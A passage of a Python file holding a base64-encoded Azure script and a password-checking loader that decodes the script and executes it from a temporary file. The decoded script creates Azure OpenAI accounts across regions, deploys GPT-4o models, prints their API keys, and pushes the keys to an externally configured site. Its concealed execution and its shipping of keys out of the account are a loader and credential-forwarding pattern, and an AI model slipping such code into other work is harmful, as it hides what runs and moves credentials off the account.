BhdGguam9pbihvcy5wYXRoLmV4cGFuZHVzZXIoIn4iKSwgImF6dXJlX2RlcGxveS9sb2dzIikKICAgIGVycm9yX2xvZ19kaXIgPSBvcy5wYXRoLmpvaW4ob3MucGF0aC5leHBhbmR1c2VyKCJ+IiksICJhenVyZV9kZXBsb3kvZXJyb3JfbG9ncyIpCiAgICAKICAgIHByaW50KCLliJvlu7rml6Xlv5fnm67lvZUuLi4iKQogICAgZm9yIGRpcmVjdG9yeSBpbiBbbG9nX2RpciwgZXJyb3JfbG9nX2Rpcl06CiAgICAgICAgb3MubWFrZWRpcnMoZGlyZWN0b3J5LCBleGlzdF9vaz1UcnVlKQogICAgICAgIHByaW50KGYi4pyTIOebruW9leW3suWHhuWkhzoge2RpcmVjdG9yeX0iKQogICAgCiAgICAjIOiOt+WPluWPr+eUqOiuoumYhQogICAgc3Vic2NyaXB0aW9ucyA9IGxpc3Rfc3Vic2NyaXB0aW9ucygpCiAgICAKICAgIGlmIG5vdCBzdWJzY3JpcHRpb25zOgogICAgICAgIHByaW50KCLplJnor6/vvJrmnKrmib7liLDlj6/nlKjnmoTorqLpmIUiKQogICAgICAgIHJldHVybgogICAgCiAgICAjIOaYvuekuuWPr+eUqOeahOiuoumYhQogICAgcHJpbnQoIlxu5Y+v55So55qE6K6i6ZiFOiIpCiAgICBmb3IgaSwgc3ViIGluIGVudW1lcmF0ZShzdWJzY3JpcHRpb25zLCAxKToKICAgICAgICBwcmludChmIntpfS4ge3N1YlsnTmFtZSddfSAoe3N1YlsnSWQnXX0pIikKICAgIAogICAgIyDmj5DkvpvpgInmi6nmlrnlvI8KICAgIHByaW50KCJcbumAieaLqeiuoumYheaWueW8jzoiKQogICAgcHJpbnQoIjEuIOS7juWIl+ihqOS4remAieaLqSIpCiAgICBwcmludCgiMi4g5omL5Yqo6L6T5YWl6K6i6ZiFSUQiKQogICAgCiAgICBzZWxlY3Rpb25fbWV0aG9kID0gaW5wdXQoIuivt+mAieaLqeaWueW8jyAoMSDmiJYgMik6ICIpCiAgICAKICAgIGlmIHNlbGVjdGlvbl9tZXRob2QgPT0gIjEiOgogICAgICAgICMg5LuO5YiX6KGo5Lit6YCJ5oupCiAgICAgICAgd2hpbGUgVHJ1ZToKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgc2VsZWN0aW9uID0gaW50KGlucHV0KGYiXG7or7fpgInmi6nopoHkvb/nlKjnmoTorqLpmIUgKDEte2xlbihzdWJzY3JpcHRpb25zKX0pOiAiKSkKICAgICAgICAgICAgICAgIGlmIDEgPD0gc2VsZWN0aW9uIDw9IGxlbihzdWJzY3JpcHRpb25zKToKICAgICAgICAgICAgICAgICAgICBzZWxlY3RlZF9zdWJzY3JpcHRpb24gPSBzdWJzY3JpcHRpb25zW3NlbGVjdGlvbiAtIDFdCiAgICAgICAgICAgICAgICAgICAgY3VycmVudF9zdWIgPSBzZWxlY3RlZF9zdWJzY3JpcHRpb25bIklkIl0KICAgICAgICAgICAgICAgICAgICBzdWJfbmFtZSA9IHNlbGVjdGVkX3N1YnNjcmlwdGlvblsiTmFtZSJdCiAgICAgICAgICAgICAgICAgICAgYnJlYWsKICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgcHJpbnQoIuaXoOaViOeahOmAieaLqe+8jOivt+mHjeivlSIpCiAgICAgICAgICAgIGV4Y2VwdCBWYWx1ZUVycm9yOgogICAgICAgICAgICAgICAgcHJpbnQoIuivt+i+k+WFpeacieaViOeahOaVsOWtlyIpCiAgICBlbHNlOgogICAgICAgICMg5omL5Yqo6L6T5YWl6K6i6ZiFSUQKICAgICAgICB3aGlsZSBUcnVlOgogICAgICAgICAgICBjdXJyZW50X3N1YiA9IGlucHV0KCJcbuivt+i+k+WFpeiuoumYhUlEOiAiKQogICAgICAgICAgICAjIOmqjOivgeiuoumYhUlE5piv5ZCm5pyJ5pWICiAgICAgICAgICAgIGlmIHNldF9zdWJzY3JpcHRpb24oY3VycmVudF9zdWIpOgogICAgICAgICAgICAgICAgc3ViX25hbWUgPSBzdWJwcm9jZXNzLnJ1bigKICAgICAgICAgICAgICAgICAgICBbImF6IiwgImFjY291bnQiLCAic2hvdyIsICItLXF1ZXJ5IiwgIm5hbWUiLCAiLW8iLCAidHN2Il0sCiAgICAgICAgICAgICAgICAgICAgY2hlY2s9VHJ1ZSwKICAgICAgICAgICAgICAgICAgICBjYXB0dXJlX291dHB1dD1UcnVlLAogICAgICAgICAgICAgICAgICAgIHRleHQ9VHJ1ZQogICAgICAgICAgICAgICAgKS5zdGRvdXQuc3RyaXAoKQogICAgICAgICAgICAgICAgYnJlYWsKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIHByaW50KCLml6DmlYjnmoTorqLpmIVJRO+8jOivt+mHjeivlSIpCiAgICAKICAgICMg6K6+572u6YCJ5a6a55qE6K6i6ZiFCiAgICBwcmludChmIuato+WcqOiuvue9ruiuoumYhToge3N1Yl9uYW1lfSAoe2N1cnJlbnRfc3VifSkuLi4iKQogICAgaWYgbm90IHNldF9zdWJzY3JpcHRpb24oY3VycmVudF9zdWIpOgogICAgICAgIHByaW50KCLorr7nva7orqLpmIXlpLHotKUiKQogICAgICAgIHJldHVybgogICAgCiAgICBwcmludChmIuaIkOWKn+iuvue9ruiuoumYhToge3N1Yl9uYW1lfSAoe2N1cnJlbnRfc3VifSkiKQogICAgCiAgICAjIOWIneWni+WMluiupOefpeacjeWKoeeuoeeQhuWuouaIt+errwogICAgY3JlZGVudGlhbCA9IGdldF9jcmVkZW50aWFsKCkKICAgIGNsaWVudCA9IENvZ25pdGl2ZVNlcnZpY2VzTWFuYWdlbWVudENsaWVudCgKICAgICAgICBjcmVkZW50aWFsPWNyZWRlbnRpYWwsCiAgICAgICAgc3Vic2NyaXB0aW9uX2lkPWN1cnJlbnRfc3ViCiAgICApCiAgICAKICAgICMg6I635Y+W5Y+v55So55qE6LWE5rqQ57uECiAgICByZXNvdXJjZV9ncm91cHMgPSBnZXRfcmVzb3VyY2VfZ3JvdXBzKCkKICAgIAogICAgaWYgbm90IHJlc291cmNlX2dyb3VwczoKICAgICAgICBwcmludCgi6ZSZ6K+vOiDmsqHmnInlj6/nlKjnmoTotYTmupDnu4TvvIzml6Dms5Xnu6fnu60iKQogICAgICAgIHJldHVybgogICAgCiAgICAjIOmaj+acuumAieaLqei1hOa6kOe7hAogICAgcmVzb3VyY2VfZ3JvdXAgPSByYW5kb20uY2hvaWNlKHJlc291cmNlX2dyb3VwcykKICAgIAogICAgIyDpqozor4HotYTmupDnu4TmmK/lkKblrZjlnKgKICAgIHRyeToKICAgICAgICBzdWJwcm9jZXNzLnJ1bigKICAgICAgICAgICAgWyJheiIsICJncm91cCIsICJzaG93IiwgIi0tbmFtZSIsIHJlc291cmNlX2dyb3VwXSwKICAgICAgICAgICAgY2hlY2s9VHJ1ZSwKICAgICAgICAgICAgc3Rkb3V0PXN1YnByb2Nlc3MuREVWTlVMTAogICAgICAgICkKICAgIGV4Y2VwdCBzdWJwcm9jZXNzLkNhbGxlZFByb2Nlc3NFcnJvcjoKICAgICAgICBwcmludChmIuitpuWRijog6ZqP5py66YCJ5oup55qE6LWE5rqQ57uEICd7cmVzb3VyY2VfZ3JvdXB9JyDkuI3lrZjlnKjvvIzlsIbmj5DkvpvpgInmi6noj5zljZUiKQogICAgICAgIAogICAgICAgICMg6YeN5paw6I635Y+W6LWE5rqQ57uE5YiX6KGo5bm26K6p55So5oi36YCJ5oupCiAgICAgICAgYXZhaWxhYmxlX2dyb3VwcyA9IGdldF9yZXNvdXJjZV9ncm91cHMoKQogICAgICAgIHByaW50KCLlj6/nlKjnmoTotYTmupDnu4Q6IikKICAgICAgICBmb3IgZ3JvdXAgaW4gYXZhaWxhYmxlX2dyb3VwczoKICAgICAgICAgICAgcHJpbnQoZ3JvdXApCiAgICAgICAgCiAgICAgICAgd2hpbGUgVHJ1ZToKICAgICAgICAgICAgcmVzb3VyY2VfZ3JvdXAgPSBpbnB1dCgi6K+36L6T5YWl6KaB5L2/55So55qE6LWE5rqQ57uE5ZCN56ewOiAiKQogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICBzdWJwcm9jZXNzLnJ1bigKICAgICAgICAgICAgICAgICAgICBbImF6IiwgImdyb3VwIiwgInNob3ciLCAiLS1uYW1lIiwgcmVzb3VyY2VfZ3JvdXBdLAogICAgICAgICAgICAgICAgICAgIGNoZWNrPVRydWUsCiAgICAgICAgICAgICAgICAgICAgc3Rkb3V0PXN1YnByb2Nlc3MuREVWTlVMTAogICAgICAgICAgICAgICAgKQogICAgICAgICAgICAgICAgYnJlYWsKICAgICAgICAgICAgZXhjZXB0IHN1YnByb2Nlc3MuQ2FsbGVkUHJvY2Vzc0Vycm9yOgogICAgICAgICAgICAgICAgcHJpbnQoZiLotYTmupDnu4QgJ3tyZXNvdXJjZV9ncm91cH0nIOS4jeWtmOWcqO+8jOivt+mHjeaWsOi+k+WFpSIpCiAgICAKICAgIHByaW50KGYi5bCG5L2/55So6LWE5rqQ57uEOiB7cmVzb3VyY2VfZ3JvdXB9IikKICAgIAogICAgIyDojrflj5bmiYDmnInljLrln5/nmoTphY3pop3mlbDmja4KICAgIHF1b3RhX3Jlc3VsdHMgPSB7fQogICAgdmFsaWRfcmVnaW9uc180byA9IFtdCiAgICB2YWxpZF9yZWdpb25zX21pbmkgPSBbXQogICAgCiAgICBwcmludCgi6I635Y+W5oyH5a6a5Yy65Z+f55qE6YWN6aKd5L+h5oGvLi4uIikKICAgIAogICAgZm9yIGxvY2F0aW9uIGluIExPQ0FUSU9OUzoKICAgICAgICBwcmludChmIuafpeivoiB7bG9jYXRpb259IOWMuuWfn+eahOmFjeminS4uLiIpCiAgICAgICAgcXVvdGEgPSBnZXRfcXVvdGFfZm9yX3JlZ2lvbihjdXJyZW50X3N1YiwgbG9jYXRpb24pCiAgICAgICAgCiAgICAgICAgcHJpbnQoZiIgIHtsb2NhdGlvbn0gZ3B0LTRvIEdsb2JhbFN0YW5kYXJkIOmFjeminToge3F1b3RhWydncHQtNG8nXX0iKQogICAgICAgIHByaW50KGYiICB7bG9jYXRpb259IGdwdC00by1taW5pIEdsb2JhbFN0YW5kYXJkIOmFjeminToge3F1b3RhWydncHQtNG8tbWluaSddfSIpCiAgICAgICAgCiAgICAgICAgcXVvdGFfcmVzdWx0c1tsb2NhdGlvbl0gPSBxdW90YQogICAgICAgIAogICAgICAgICMg5YiG5Yir5qOA5p+lIGdwdC00byDlkowgZ3B0LTRvLW1pbmkg6YWN6aKd5piv5ZCm5aSn5LqO6ZiI5YC8CiAgICAgICAgaWYgcXVvdGFbJ2dwdC00byddID49IE1JTl9RVU9UQV9USFJFU0hPTEQ6CiAgICAgICAgICAgIHZhbGlkX3JlZ2lvbnNfNG8uYXBwZW5kKGxvY2F0aW9uKQogICAgICAgICAgICBwcmludChmIiAge2xvY2F0aW9ufSDljLrln58gZ3B0LTRvIOmFjemineWkp+S6jiB7TUlOX1FVT1RBX1RIUkVTSE9MRH3vvIzlsIbpg6jnvbIgZ3B0LTRvIOezu+WIl+aooeWeiyIpCiAgICAgICAgCiAgICAgICAgaWYgcXVvdGFbJ2dwdC00by1taW5pJ10gPj0gTUlOX1FVT1RBX1RIUkVTSE9MRDoKICAgICAgICAgICAgdmFsaWRfcmVnaW9uc19taW5pLmFwcGVuZChsb2NhdGlvbikKICAgICAgICAgICAgcHJpbnQoZiIgIHtsb2NhdGlvbn0g5Yy65Z+fIGdwdC00by1taW5pIOmFjemineWkp+S6jiB7TUlOX1FVT1RBX1RIUkVTSE9MRH3vvIzlsIbpg6jnvbIgZ3B0LTRvLW1pbmkg5qih5Z6LIikKICAgICAgICAKICAgICAgICBpZiBxdW90YVsnZ3B0LTRvJ10gPCBNSU5fUVVPVEFfVEhSRVNIT0xEIGFuZCBxdW90YVsnZ3B0LTRvLW1pbmknXSA8IE1JTl9RVU9UQV9USFJFU0hPTEQ6CiAgICAgICAgICAgIHByaW50KGYiICB7bG9jYXRpb259IOWMuuWfn+aJgOacieaooeWei+mFjeminemDveWwj+S6jiB7TUlOX1FVT1RBX1RIUkVTSE9MRH3vvIzlsIbooqvot7Pov4ciKQogICAgCiAgICBpZiBub3QgdmFsaWRfcmVnaW9uc180byBhbmQgbm90IHZhbGlkX3JlZ2lvbnNfbWluaToKICAgICAgICBwcmludChmIuayoeacieaJvuWIsOmFjemineWkp+S6jiB7TUlOX1FVT1RBX1RIUkVTSE9MRH0g55qE5Yy65Z+f77yM5peg5rOV6L+b6KGM6YOo572yIikKICAgICAgICByZXR1cm4KICAgIAogICAgcHJpbnQoZiLmib7liLAge2xlbih2YWxpZF9yZWdpb25zXzRvKX0g5Liq5Y+v6YOo572yIGdwdC00byDnmoTljLrln586IHsnLCAnLmpvaW4odmFsaWRfcmVnaW9uc180bykgaWYgdmFsaWRfcmVnaW9uc180byBlbHNlICfml6AnfSIpCiAgICBwcmludChmIuaJvuWIsCB7bGVuKHZhbGlkX3JlZ2lvbnNfbWluaSl9IOS4quWPr+mDqOe9siBncHQtNG8tbWluaSDnmoTljLrln586IHsnLCAnLmpvaW4odmFsaWRfcmVnaW9uc19taW5pKSBpZiB2YWxpZF9yZWdpb25zX21pbmkgZWxzZSAn5pegJ30iKQogICAgCiAgICAjIOWQiOW5tumcgOimgemDqOe9sueahOWMuuWfnwogICAgYWxsX3ZhbGlkX3JlZ2lvbnMgPSBsaXN0KHNldCh2YWxpZF9yZWdpb25zXzRvICsgdmFsaWRfcmVnaW9uc19taW5pKSkKICAgIAogICAgIyDnlJ/miJDml7bpl7TmiLPlkozpmo/mnLrlkI7nvIAKICAgIHRpbWVzdGFtcCA9IGdldF9zaGFuZ2hhaV90aW1lKCkKICAgIHJhbmRvbV9zdWZmaXggPSBnZXRfcmFuZG9tX3N0cmluZyg2KQogICAgCiAgICAjIOWtmOWCqOmDqOe9suS/oeaBrwogICAgZGVwbG95bWVudF9pbmZvID0ge30KICAgIHN1Y2Nlc3NfZGVwbG95bWVudHMgPSBbXQogICAgCiAgICAjIOmAkOS4quWMuuWfn+i/m+ihjOWkhOeQhgogICAgZm9yIGxvY2F0aW9uIGluIGFsbF92YWxpZF9yZWdpb25zOgogICAgICAgICMg55Sf5oiQ5pyN5Yqh5ZCN56ewCiAgICAgICAgcHJlZml4ID0gZ2V0X2xvY2F0aW9uX3ByZWZpeChsb2NhdGlvbikKICAgICAgICBzZXJ2aWNlX25hbWUgPSBmIntwcmVmaXh9LXt0aW1lc3RhbXB9LXtyYW5kb21fc3VmZml4fSIKICAgICAgICAKICAgICAgICBwcmludChmIlxu5byA5aeL6YOo572yIHtsb2NhdGlvbn0g5Yy65Z+f55qET3BlbkFJ5pyN5YqhOiB7c2VydmljZV9uYW1lfS4uLiIpCiAgICAgICAgCiAgICAgICAgIyAxLiDliJvlu7rotKbmiLcKICAgICAgICBpZiBjcmVhdGVfYWNjb3VudChjbGllbnQsIHJlc291cmNlX2dyb3VwLCBsb2NhdGlvbiwgc2VydmljZV9uYW1lKToKICAgICAgICAgICAgIyAyLiDpg6jnvbLmqKHlnosKICAgICAgICAgICAgZ3B0NG9fcXVvdGEgPSBxdW90YV9yZXN1bHRzW2xvY2F0aW9uXVsiZ3B0LTRvIl0KICAgICAgICAgICAgZ3B0NG9fbWluaV9xdW90YSA9IHF1b3RhX3Jlc3VsdHNbbG9jYXRpb25dWyJncHQtNG8tbWluaSJdCiAgICAgICAgICAgIGRlcGxveWVkX21vZGVscyA9IFtdCiAgICAgICAgICAgIG1vZGVsX2RlcGxveW1lbnRfc3VjY2VzcyA9IFRydWUKICAgICAgICAgICAgCiAgICAgICAgICAgICMg5a2Y5YKo5a6e6ZmF6YOo572y55qE5qih5Z6L5L+h5oGv77yM55So5LqO5o6o6YCBCiAgICAgICAgICAgIG1vZGVsc19mb3JfcHVzaCA9IFtdCiAgICAgICAgICAgIAogICAgICAgICAgICAjIOaMiemhuuW6j+mDqOe9suavj+S4quaooeWeiwogICAgICAgICAgICBmb3IgbW9kZWwgaW4gTU9ERUxTX0NPTkZJRzoKICAgICAgICAgICAgICAgIHNob3VsZF9kZXBsb3lfbW9kZWwgPSBGYWxzZQogICAgICAgICAgICAgICAgY2FwYWNpdHkgPSAwCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGlmIG1vZGVsWyJuYW1lIl0gPT0gImdwdC00by1taW5pIjoKICAgICAgICAgICAgICAgICAgICBpZiBncHQ0b19taW5pX3F1b3RhID49IE1JTl9RVU9UQV9USFJFU0hPTEQ6CiAgICAgICAgICAgICAgICAgICAgICAgIGNhcGFjaXR5ID0gaW50KGdwdDRvX21pbmlfcXVvdGEpCiAgICAgICAgICAgICAgICAgICAgICAgIHNob3VsZF9kZXBsb3lfbW9kZWwgPSBUcnVlCiAgICAgICAgICAgICAgICAgICAgICAgIG1vZGVsc19mb3JfcHVzaC5hcHBlbmQoewogICAgICAgICAgICAgICAgICAgICAgICAgICAgIm1vZGVscyI6IGYie21vZGVsWyduYW1lJ119LXttb2RlbFsndmVyc2lvbiddfSIsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAibmFtZV9wcmVmaXgiOiAibWluaSIKICAgICAgICAgICAgICAgICAgICAgICAgfSkKICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgaWYgZ3B0NG9fcXVvdGEgPj0gTUlOX1FVT1RBX1RIUkVTSE9MRDoKICAgICAgICAgICAgICAgICAgICAgICAgY2FwYWNpdHkgPSBpbnQoZ3B0NG9fcXVvdGEgKiBtb2RlbFsicmF0aW8iXSkKICAgICAgICAgICAgICAgICAgICAgICAgaWYgY2FwYWNpdHkgPiAwOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgc2hvdWxkX2RlcGxveV9tb2RlbCA9IFRydWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIG1vZGVsWyJ2ZXJzaW9uIl0gPT0gIjIwMjQtMDUtMTMiOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIG1vZGVsc19mb3JfcHVzaC5hcHBlbmQoewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAibW9kZWxzIjogZiJ7bW9kZWxbJ25hbWUnXX0te21vZGVsWyd2ZXJzaW9uJ119IiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIm5hbWVfcHJlZml4IjogIjA1MTMiCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsaWYgbW9kZWxbInZlcnNpb24iXSA9PSAiMjAyNC0wOC0wNiI6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbW9kZWxzX2Zvcl9wdXNoLmFwcGVuZCh7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICJtb2RlbHMiOiBmInttb2RlbFsnbmFtZSddfS17bW9kZWxbJ3ZlcnNpb24nXX0iLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAibmFtZV9wcmVmaXgiOiAiMDgwNiIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxpZiBtb2RlbFsidmVyc2lvbiJdID09ICIyMDI0LTExLTIwIjoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBtb2RlbHNfZm9yX3B1c2guYXBwZW5kKHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIm1vZGVscyI6IGYie21vZGVsWyduYW1lJ119LXttb2RlbFsndmVyc2lvbiddfSIsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICJuYW1lX3ByZWZpeCI6ICIxMTIwIgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGlmIHNob3VsZF9kZXBsb3lfbW9kZWw6CiAgICAgICAgICAgICAgICAgICAgaWYgY3JlYXRlX21vZGVsX2RlcGxveW1lbnQoY2xpZW50LCByZXNvdXJjZV9ncm91cCwgc2VydmljZV9uYW1lLCBtb2RlbCwgY2FwYWNpdHkpOgogICAgICAgICAgICAgICAgICAgICAgICBkZXBsb3llZF9tb2RlbHMuYXBwZW5kKGYie21vZGVsWyduYW1lJ119LXttb2RlbFsndmVyc2lvbiddfSIpCiAgICAgICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICAgICAgbW9kZWxfZGVwbG95bWVudF9zdWNjZXNzID0gRmFsc2UKICAgICAgICAgICAgICAgICAgICAgICAgIyDlpoLmnpzpg6jnvbLlpLHotKXvvIzku47mjqjpgIHliJfooajkuK3np7vpmaQKICAgICAgICAgICAgICAgICAgICAgICAgbW9kZWxzX2Zvcl9wdXNoID0gW20gZm9yIG0gaW4gbW9kZWxzX2Zvcl9wdXNoIGlmIG1bIm1vZGVscyJdICE9IGYie21vZGVsWyduYW1lJ119LXttb2RlbFsndmVyc2lvbiddfSJdCiAgICAgICAgICAgIAogICAgICAgICAgICAjIDMuIOiOt+WPluWvhumSpQogICAgICAgICAgICBrZXlzID0gZ2V0X2FjY291bnRfa2V5cyhjbGllbnQsIHJlc291cmNlX2dyb3VwLCBzZXJ2aWNlX25hbWUpCiAgICAgICAgICAgIAogICAgICAgICAgICBpZiBrZXlzIGFuZCBkZXBsb3llZF9tb2RlbHM6ICAjIOehruS/neacieaIkOWKn+mDqOe9sueahOaooeWeiwogICAgICAgICAgICAgICAgZW5kcG9pbnQgPSBmImh0dHBzOi8ve3NlcnZpY2VfbmFtZX0uY29nbml0aXZlc2VydmljZXMuYXp1cmUuY29tLyIKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgcHJpbnQoZiJFbmRwb2ludDoge2VuZHBvaW50fSIpCiAgICAgICAgICAgICAgICBwcmludChmIktleSAxOiB7a2V5c1sna2V5MSddfSIpCiAgICAgICAgICAgICAgICBwcmludChmIktleSAyOiB7a2V5c1sna2V5MiddfSIpCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICMg5L+d5a2Y6YOo572y5L+h5oGv55So5LqO5ZCO57ut5o6o6YCBCiAgICAgICAgICAgICAgICBkZXBsb3ltZW50X2luZm9bbG9jYXRpb25dID0gewogICAgICAgICAgICAgICAgICAgICJzZXJ2aWNlX25hbWUiOiBzZXJ2aWNlX25hbWUsCiAgICAgICAgICAgICAgICAgICAgImVuZHBvaW50IjogZW5kcG9pbnQsCiAgICAgICAgICAgICAgICAgICAgImtleTEiOiBrZXlzWyJrZXkxIl0sCiAgICAgICAgICAgICAgICAgICAgImtleTIiOiBrZXlzWyJrZXkyIl0sCiAgICAgICAgICAgICAgICAgICAgImRlcGxveWVkX21vZGVscyI6IGRlcGxveWVkX21vZGVscywKICAgICAgICAgICAgICAgICAgICAibW9kZWxzX2Zvcl9wdXNoIjogbW9kZWxzX2Zvcl9wdXNoICAjIOWtmOWCqOaOqOmAgeaJgOmcgOeahOaooeWei+S/oeaBrwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBzdWNjZXNzX2RlcGxveW1lbnRzLmFwcGVuZCh7CiAgICAgICAgICAgICAgICAgICAgImxvY2F0aW9uIjogbG9jYXRpb24sCiAgICAgICAgICAgICAgICAgICAgInNlcnZpY2VfbmFtZSI6IHNlcnZpY2VfbmFtZQogICAgICAgICAgICAgICAgfSkKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgIyDorrDlvZXmiJDlip/pg6jnvbLkv6Hmga/liLDml6Xlv5cKICAgICAgICAgICAgICAgIHN1Y2Nlc3NfbG9nID0gewogICAgICAgICAgICAgICAgICAgICJUaW1lc3RhbXAiOiBkYXRldGltZS5ub3coKS5zdHJmdGltZSgiJVktJW0tJWQgJUg6JU06JVMiKSwKICAgICAgICAgICAgICAgICAgICAiU3Vic2NyaXB0aW9uSWQiOiBjdXJyZW50X3N1YiwKICAgICAgICAgICAgICAgICAgICAiTG9jYXRpb24iOiBsb2NhdGlvbiwKICAgICAgICAgICAgICAgICAgICAiU2VydmljZU5hbWUiOiBzZXJ2aWNlX25hbWUsCiAgICAgICAgICAgICAgICAgICAgIkVuZHBvaW50IjogZW5kcG9pbnQsCiAgICAgICAgICAgICAgICAgICAgIkRlcGxveWVkTW9kZWxzIjogIiwgIi5qb2luKGRlcGxveWVkX21vZGVscykKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgd2l0aCBvcGVuKG9zLnBhdGguam9pbihsb2dfZGlyLCAic3VjY2Vzc2Z1bF9kZXBsb3ltZW50cy5sb2ciKSwgImEiKSBhcyBmOgogICAgICAgICAgICAgICAgICAgIGYud3JpdGUoanNvbi5kdW1wcyhzdWNjZXNzX2xvZykgKyAiXG4iKQogICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgcHJpbnQoIuiOt+WPluWvhumSpeS/oeaBr+Wksei0peaIluayoeacieaIkOWKn+mDqOe9sueahOaooeWeiyIpCiAgICAgICAgZWxzZToKICAgICAgICAgICAgcHJpbnQoZiJPcGVuQUnmnI3liqHotKbmiLfliJvlu7rlpLHotKU6IHtzZXJ2aWNlX25hbWV9IikKICAgIAogICAgIyDmjqjpgIHliLDnq5nngrkKICAgIHByaW50KCJcbuW8gOWni+aOqOmAgeWQhOWMuuWfn+mDqOe9sueahOaooeWei+WIsOermeeCuS4uLiIpCiAgICAKICAgICMg5o6o6YCB5q+P5Liq5oiQ5Yqf6YOo572y55qE5Yy65Z+fCiAgICBpZiBzdWNjZXNzX2RlcGxveW1lbnRzOgogICAgICAgIGZvciBkZXBsb3ltZW50IGluIHN1Y2Nlc3NfZGVwbG95bWVudHM6CiAgICAgICAgICAgIGxvY2F0aW9uID0gZGVwbG95bWVudFsibG9jYXRpb24iXQogICAgICAgICAgICBkZXBsb3lfaW5mbyA9IGRlcGxveW1lbnRfaW5mb1tsb2NhdGlvbl0KICAgICAgICAgICAgCiAgICAgICAgICAgICMg5o6o6YCB5Yiw56uZ54K5CiAgICAgICAgICAgIHByaW50KGYiXG7mjqjpgIEge2xvY2F0aW9ufSDljLrln5/liLDnq5nngrkuLi4iKQogICAgICAgICAgICBrZXkgPSBkZXBsb3lfaW5mb1sia2V5MSJdCiAgICAgICAgICAgIGJhc2VfdXJsID0gZGVwbG95X2luZm9bImVuZHBvaW50Il0KICAgICAgICAgICAgbW9kZWxzX2Zvcl9wdXNoID0gZGVwbG95X2luZm9bIm1vZGVsc19mb3JfcHVzaCJdCiAgICAgICAgICAgIAogICAgICAgICAgICAjIOagueaNruWunumZhemDqOe9sueahOaooeWei+aOqOmAgQogICAgICAgICAgICBwcmludChmIuWwhuaOqOmAgeS7peS4i+aooeWeizogeycsICcuam9pbihbbVsnbW9kZWxzJ10gZm9yIG0gaW4gbW9kZWxzX2Zvcl9wdXNoXSl9IikKICAgICAgICAgICAgcHVzaF90b19zaXRlX2J5X21vZGVscyhrZXksIGJhc2VfdXJsLCBtb2RlbHNfZm9yX3B1c2gsIFNJVEVfQ09ORklHKQogICAgICAgICAgICBwcmludChmIntsb2NhdGlvbn0g5Yy65Z+f5o6o6YCB5a6M5oiQIikKICAgICAgICAKICAgICAgICBwcmludCgiXG7miYDmnInljLrln5/mjqjpgIHmk43kvZzlrozmiJAiKQogICAgZWxzZToKICAgICAgICBwcmludCgi5rKh5pyJ5oiQ5Yqf6YOo572y55qE5Yy65Z+f77yM5peg5rOV5o6o6YCBIikKCmlmIF9fbmFtZV9fID09ICJfX21haW5fXyI6CiAgICBtYWluKCk=
"""

# 安全验证信息
PASSWORD_HASH = "aa8e4c230111e7d6654e3a9aecd79405e34fa3b23b45ef8624e4ee4bc2a0cefe"
SALT = "8a7b6c5d4e3f"

def secure_hash(password, salt):
    """验证密码的哈希函数"""
    return hashlib.sha256((password + salt).encode()).hexdigest()

def verify_password():
    """验证用户输入的密码"""
    for attempt in range(3):  # 允许3次尝试
        try:
            password = getpass.getpass("请输入密码: ")
            if secure_hash(password, SALT) == PASSWORD_HASH:
                return True
            else:
                print(f"密码错误，还有 {2 - attempt} 次尝试机会")
        except KeyboardInterrupt:
            print("\n操作已取消")
            sys.exit(1)
            
    print("密码验证失败，退出程序")
    return False

def run_script():
    """验证密码，解码并运行脚本"""
    try:
        # 先验证密码
        if not verify_password():
            sys.exit(1)
            
        print("密码验证成功，正在启动程序...")
            
        # Base64解码
        script_code = base64.b64decode(SCRIPT_DATA)
        
        # 创建临时文件
        fd, temp_path = tempfile.mkstemp(suffix='.py')
        os.close(fd)
        
        # 写入解码后的脚本
        with open(temp_path, 'wb') as f:
            f.write(script_code)
        
        # 导入并运行脚本
        spec = importlib.util.spec_from_file_location("temp_module", temp_path)
        module = importlib.util.module_from_spec(spec)
        sys.modules["temp_module"] = module
        spec.loader.exec_module(module)
        
        # 清理临时文件
        try:
            os.unlink(temp_path)
        except:
            pass
            
    except Exception as e:
        print(f"运行脚本时出错: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    run_script()
